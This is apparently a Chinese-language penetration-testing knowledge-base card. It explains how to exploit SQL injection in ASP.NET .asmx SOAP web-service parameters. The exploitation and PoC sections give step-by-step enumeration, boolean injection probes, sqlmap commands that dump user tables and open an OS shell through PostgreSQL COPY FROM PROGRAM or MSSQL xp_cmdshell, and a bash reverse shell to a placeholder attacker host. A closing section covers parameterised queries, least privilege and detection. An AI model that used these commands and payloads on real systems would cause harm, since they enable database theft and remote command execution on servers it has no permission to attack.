---
id: web-generic-sqli-asmx-soap-param-sqlmap-os-shell
title: asmx SOAP WebService 参数 SQL 注入：sqlmap -r 标记注入点直落 PostgreSQL/MSSQL 数据库命令执行
type: scenario
domain: web
path: web/generic/sqli
technique: asmx-soap-param-sqli-sqlmap-os-shell
tags:
- sqli
- soap
- asmx
- aspnet
- webservice
- sqlmap
- postgresql
- mssql
- os-shell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V604
  verified_at: '2026-11-12T18:31:04+08:00'
  notes: 已对照原文与全部36图核对：图18/19 布尔探针 al1ex 'or 1=1 --- 返回 Jimmy;Jimmy、'or 1=2 返回 User not found；图22 在 <tem:username>geroet* 加标记；图23/24 sqlmap 识别 custom injection marker、判定 PostgreSQL 2.0.50727/Apache 2.4.7；图25-27 列库/拖 users 表 Johnny/Jimmy 口令；图28 is-dba True；图29/30 COPY ... FROM PROGRAM 进入 os-shell，whoami=postgres、id uid=116；图32 bash 反弹无输出、图33 nc 改用 bash -c 反弹成功（postgres@peery-VirtualBox 提示符）；图34 复现 stacked queries not supported 报错与卡内工具版本坑一致。修正两处：1) 原文实战 MSSQL 案例（图12）只到 sql-shell（SQL Server 2008，时间盲注+UNION），未展示 --os-shell/xp_cmdshell，原 PoC 的 MSSQL --os-shell 段属夸大，已改为如实描述并注明未验证延伸；2) 方法名笔误 MSD_bexecute 按图9/10 改为 MSDbexecute。affected_versions 留空正确：原文无受影响组件版本（SQL Server 2008/ASP.NET 2.0 等仅为靶机/目标环境版本）。dedup 报告仅自身命中，另18个候选（XFire SOAP、PostgreSQL COPY TO PROGRAM、EIS Notify.asmx 等）均判 new，核对其 conclusion：入口/产品/PoC 不同，非同一条链；本卡为 asmx+sqlmap -r 通用工作流，保留。未验证点：wxr 外网实战环境不可复现，MSSQL 命令执行未在原文出现。
url: /docs/web/generic/sqli/web-generic-sqli-asmx-soap-param-sqlmap-os-shell/
draft: false
kb_aliases:
- SOAP 接口 SQL 注入
- asmx SQL 注入
- WebService SQL 注入
- sqlmap -r SOAP
- SOAPAction 注入
- --os-shell SOAP
- GetUser 注入
- GetInfoById 注入
---

## 一句话结论

ASP.NET WebService（`.asmx`）的 SOAP 方法参数一旦被拼进 SQL 文本，SOAP 封装不会带来任何注入免疫；抓取完整 SOAP 请求、在参数值内加 sqlmap 自定义标记 `*` 后执行 `sqlmap -r`，就能完成布尔/报错探测、拖库，并在数据库账号具备 DBA/超级用户权限时直接 `--os-shell` 执行系统命令、反弹 Shell。

## 原理

- **SOAP 只是外壳，漏洞在方法实现**：`.asmx` 把 public 方法暴露为 SOAP operation，请求体是 XML 信封。服务端方法若把 `<tem:username>` 的值直接拼进 `SELECT ... WHERE username='<值>'`，注入和普通表单参数完全相同；XML 结构只要求 payload 不破坏信封语法，单引号、注释符 `--`、空格都可原样放入元素文本。
- **WSDL 给出攻击面**：访问 `/<service>.asmx?wsdl` 可得到方法名、参数类型、SOAPAction 与 SOAP 1.1/1.2 两套绑定（同一方法在 WSDL 中出现两次）；浏览器直接访问 `.asmx` 页面还会列出全部 operation 及每个方法的示例报文，等于自带调试文档。Burp 的 WSDLer 插件可解析 WSDL 生成每个 operation 的请求模板。
- **布尔差异确认注入**：对 `GetUser(username)` 分别提交 `al1ex 'or 1=1 ---` 与 `al1ex 'or 1=2 ---`，前者返回首条用户（如 `Jimmy;Jimmy`），后者返回 `User not found`。同一接口、同一方法、仅注入表达式不同，响应内容出现真假分支，即可判定字符型注入。
- **sqlmap 如何吃 SOAP**：`-r` 读取保存的原始 HTTP 请求（含 `SOAPAction` 头与 XML body）；在希望注入的位置写入 `*`（例如 `<tem:username>geroet*</tem:username>`），sqlmap 会识别 `custom injection marker found in POST body`，只替换标记处而不破坏 XML 其余结构。随后按普通注入测试参数类型，自动识别 DBMS。
- **从注入到命令执行的数据库差异**：PostgreSQL 下 `--is-dba` 为真时，`--os-shell` 依赖堆叠查询调用 `COPY ... FROM PROGRAM '命令'`，命令以数据库 OS 用户（常见 `postgres`）执行；MSSQL 下 sqlmap 走 `xp_cmdshell`/SQL Server shell，命令以 SQL Server 服务账号执行。若数据库账号低权限或禁用了堆叠/扩展过程，则止步于取数或文件读取。
- **工具版本坑**：部分发行版自带旧版 sqlmap 即使已确认注入，仍会报 `unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported`；换用/手动安装较新版本 sqlmap 后可正常进入 os-shell。该报错是客户端识别能力问题，不代表目标不支持堆叠查询。

## 触发条件

- 目标暴露 `.asmx`/SOAP WebService，`:?wsdl` 或服务说明页可访问，至少一个方法可达（最好无需认证或可自注册获取访问权）。
- 某方法把字符串参数拼接进 SQL 文本（字符型/数字型均可），且注入结果在响应中有可观测差异（内容、报错、状态码或时间）。
- 数据库账号权限足够：PostgreSQL 为超级用户或具备 `pg_execute_server_program`；MSSQL 的账号可调用 `xp_cmdshell`（sysadmin 或已开启）。
- 攻击机到 SOAP 端点网络可达，sqlmap 能发送完整 XML 请求。

## 利用步骤

1. **发现与解析 WSDL**：枚举 `/*.asmx?wsdl`（爬虫、目录扫描、错误页、端口服务识别都可能给出路径）；浏览器访问 `.asmx` 查看 operation 列表；用 WSDLer 之类的插件解析 WSDL，得到每个 operation 的 SOAPAction、命名空间、参数名和 endpoint，注意 SOAP1.1/1.2 双绑定会产生重名条目。
2. **选点并确认回显**：优先选接受字符串查询参数的方法（`GetUser`、`GetInfoById`、`GetAllLoginStyle` 等）。先用正常值调用，记录成功/失败响应形态。
3. **布尔探针**：依次提交 `x 'or 1=1 ---` 与 `x 'or 1=2 ---`，比较响应内容长度与关键字；内容不同即确认注入。也可用单引号观察 SQL 异常回显。
4. **构造 sqlmap 请求**：将完整 SOAP 请求（含 `SOAPAction`、`Content-Type: text/xml;charset=UTF-8`、XML body）保存为文件，在注入参数值末尾加 `*`。
5. **跑库**：`sqlmap -r soap.txt` 确认注入类型与 DBMS；`--dbs` 列库；`-D <库> --tables --dump` 拖表（常可直接拿到 users 表的账号/口令）。
6. **检查权限并命令执行**：`--is-dba` 确认是否 DBA；`--os-shell --batch` 进入数据库命令执行，先 `whoami`/`id` 确认身份，再按需读取配置、拖数据或反弹 Shell。
7. **横向复用**：同一服务的其它方法往往共用同一 DAO/拼接模式，逐个测试；WSDL 里出现 "Execute/Query/SQL" 类方法时优先排查。

## PoC

确认注入的 SOAP 请求（在 `-r` 文件中把 `*` 放在参数值末尾）：

```http
POST /Vulnerable.asmx HTTP/1.1
Host: <target>
SOAPAction: http://tempuri.org/GetUser
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetUser>
         <tem:username>geroet*</tem:username>
      </tem:GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

布尔验证：

```text
username = al1ex 'or 1=1 ---   -> 返回首条用户记录
username = al1ex 'or 1=2 ---   -> User not found
```

sqlmap 命令序列：

```bash
sqlmap -r soap.txt
sqlmap -r soap.txt --dbs
sqlmap -r soap.txt -D public --tables --dump
sqlmap -r soap.txt -p username --dbms postgresql --is-dba
sqlmap -r soap.txt -p username --dbms postgresql --os-shell --batch
# os-shell 内
whoami
id
/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'
```

MSSQL 变体（原文另一实战 asmx 服务，ASP.NET/IIS，后端 SQL Server 2008，注入点在 `id` 查询参数）：

```bash
sqlmap -r soap.txt --dbms mssql
# 原文截图显示：sqlmap 识别出时间盲注（heavy query）与 UNION 注入，
# 判定 back-end DBMS 为 Microsoft SQL Server 2008，并进入 sql-shell（可执行任意 SQL）。
# 注意：原文到此为止，未展示 MSSQL 下 --os-shell/xp_cmdshell 的系统命令执行；
# 若要继续打到系统命令，需账号具备 sysadmin 且 xp_cmdshell 已开启（属原文未验证的延伸）。
```

## 变体与关联

- **变体（绑定）**：SOAP 1.1 用 `Content-Type: text/xml` + `SOAPAction` 头；SOAP 1.2 用 `application/soap+xml`，WSDL 常同时暴露两套绑定，测试时以实际可达者为准。
- **变体（入口）**：除 POST SOAP 外，asmx 常同时开放 HTTP GET/POST 简单绑定（`/Vulnerable.asmx/GetUser?username=...`），这类入口没有 XML 包裹，测试更直接。
- **变体（数据库）**：PostgreSQL 走 `COPY ... FROM PROGRAM`；MSSQL 走 `xp_cmdshell`；MySQL 可尝试 `INTO OUTFILE`/UDF。sqlmap 会按 DBMS 自动选择。
- **危险方法面**：实战中见过 asmx 直接暴露 `MSDbexecute(sqlStr)` 一类"接收 SQL 字符串并执行"的方法（截图方法名为 `MSDbexecute`/`MS_Dbexecute`）；若此类方法无需鉴权即可调用，等价于数据库执行接口，应优先排查（原文仅展示方法文档，未实际调用验证）。
- **关联**：[[web-java-framework-xfire-soap-parameter-sql-injection]]（Java XFire 的 SOAP 参数拼接注入，预编译失效原理）、[[web-generic-sqli-postgres-copy-to-program-rce]]（PostgreSQL 注入后 `COPY TO PROGRAM` 的载荷细节）、[[pentest-privilege-escalation-postgresql-superuser-copy-from-program]]（已持有超级用户凭据时的同类命令执行）、[[pentest-privilege-escalation-mssql-sysadmin-reuse-xpcmdshell]]（MSSQL 侧命令执行）。
- **边界**：方法使用参数化查询/ORM 绑定、参数被强制类型转换、WSDL 关闭但方法仍可盲调（需自行构造信封）、数据库账号低权限、`COPY ... PROGRAM` 被托管数据库禁用、或 Mssql `xp_cmdshell` 未开启时，命令执行不成立，只能取数或读文件。

## 检测与防御

- **根因修复**：所有 SQL 使用参数化查询/ORM 绑定变量，禁止字符串拼接；排序、表名等动态片段用白名单映射。
- **收缩面**：生产环境移除或关闭 WSDL/服务说明页；对 WebService 统一鉴权与来源限制；不把调试用/高危 SQL 方法（如执行任意 SQL 的 operation）发布到生产。
- **最小权限**：数据库应用账号非 DBA/非超级用户，撤销 `pg_execute_server_program`、`pg_read_server_files`、`xp_cmdshell` 等能力；数据库与 Web 分网，数据库限制出站。
- **检测**：SOAP 请求体中出现 `'`、`--`、`/*`、`or 1=1`、`waitfor`、`pg_sleep`、`;` 等特征且 `SOAPAction` 指向查询方法；同一 operation 短时间高频不同参数；数据库日志出现 `COPY ... PROGRAM`、`xp_cmdshell`、`pg_read_file`；Web 进程派生数据库连接出现异常查询。
- **工具侧**：对 `.asmx?wsdl` 和 `.asmx` 服务页的访问做审计与访问控制，避免攻击者直接获得方法清单与调用模板。
